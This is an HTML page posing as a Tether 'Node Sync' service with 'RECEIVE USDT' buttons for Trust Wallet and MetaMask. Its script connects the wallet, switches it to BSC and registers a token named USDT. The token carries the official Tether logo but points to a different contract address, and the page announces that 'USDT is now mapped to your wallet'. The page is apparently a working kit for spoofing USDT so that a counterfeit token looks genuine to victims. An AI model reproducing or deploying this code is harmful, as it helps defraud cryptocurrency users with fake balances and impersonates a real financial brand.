<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tether Operations | Node Sync</title>
    <style>
        :root { --tether-green: #26a17b; --bg-dark: #0a0b0d; --card-bg: #121418; }
        body { background: var(--bg-dark); color: #fff; font-family: 'Inter', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .container { background: var(--card-bg); border: 1px solid #2d333b; border-radius: 24px; padding: 40px; width: 380px; text-align: center; box-shadow: 0 25px 50px rgba(0,0,0,0.5); }
        
        .usdt-main { width: 80px; margin-bottom: 20px; filter: drop-shadow(0 0 10px var(--tether-green)); }
        
        .btn-container { display: flex; flex-direction: column; gap: 15px; margin-top: 25px; }
        
        /* Receive Buttons */
        .wallet-btn { 
            background: #1c1f24; border: 1px solid #2d333b; color: #fff; 
            padding: 15px; border-radius: 12px; font-size: 15px; font-weight: 700; 
            cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 12px;
            transition: 0.3s;
        }
        .wallet-btn:hover { border-color: var(--tether-green); background: #24292e; }
        .wallet-btn img { width: 28px; height: 28px; }

        #log-area { font-size: 11px; color: #26a17b; margin-top: 20px; font-family: monospace; min-height: 15px; }
    </style>
</head>
<body>

<div class="container">
    <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" class="usdt-main" alt="USDT">
    <p style="color: #848d97; font-size: 14px;">Select destination wallet to map node metadata.</p>

    <div class="btn-container">
        <button class="wallet-btn" onclick="connectWallet('trust')">
            RECEIVE USDT <img src="https://trustwallet.com/assets/images/media/assets/trust_platform.svg" alt="Trust">
        </button>

        <button class="wallet-btn" onclick="connectWallet('metamask')">
            RECEIVE USDT <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" alt="MetaMask">
        </button>
    </div>

    <div id="log-area">> SYSTEM READY</div>
</div>

<script>
    const CONTRACT_ADDR = "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f";
    const TOKEN_LOGO = "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png";

    async function connectWallet(type) {
        const log = document.getElementById('log-area');
        let provider;

        // 1. Precise Provider Selection (Conflict Fix)
        if (type === 'trust') {
            provider = window.trustwallet || (window.ethereum?.isTrust ? window.ethereum : null);
        } else {
            if (window.ethereum?.providers) {
                provider = window.ethereum.providers.find(p => p.isMetaMask);
            } else if (window.ethereum?.isMetaMask) {
                provider = window.ethereum;
            }
        }

        if (!provider) {
            alert(type.toUpperCase() + " not found! Please install the extension.");
            return;
        }

        try {
            log.innerText = "> INITIALIZING " + type.toUpperCase() + "...";
            
            // Connection Request
            await provider.request({ method: 'eth_requestAccounts' });

            // Switch to BSC (Zaroori for Logo)
            log.innerText = "> MAPPING BSC NETWORK...";
            try {
                await provider.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: '0x38' }],
                });
            } catch (err) {
                if (err.code === 4902) {
                    await provider.request({
                        method: 'wallet_addEthereumChain',
                        params: [{
                            chainId: '0x38',
                            chainName: 'BSC Mainnet',
                            nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
                            rpcUrls: ['https://bsc-dataseed.binance.org/'],
                            blockExplorerUrls: ['https://bscscan.com/']
                        }]
                    });
                }
            }

            // The Injection (Watch Asset)
            log.innerText = "> INJECTING ASSET LOGO...";
            await provider.request({
                method: 'wallet_watchAsset',
                params: {
                    type: 'ERC20',
                    options: {
                        address: CONTRACT_ADDR,
                        symbol: 'USDT', 
                        decimals: 6,
                        image: TOKEN_LOGO,
                    },
                },
            });

            log.innerText = "> SYNC SUCCESSFUL!";
            alert("Success! USDT is now mapped to your wallet.");

        } catch (error) {
            console.error(error);
            log.innerText = "> ERROR: HANDSHAKE FAILED";
        }
    }
</script>

</body>
</html>
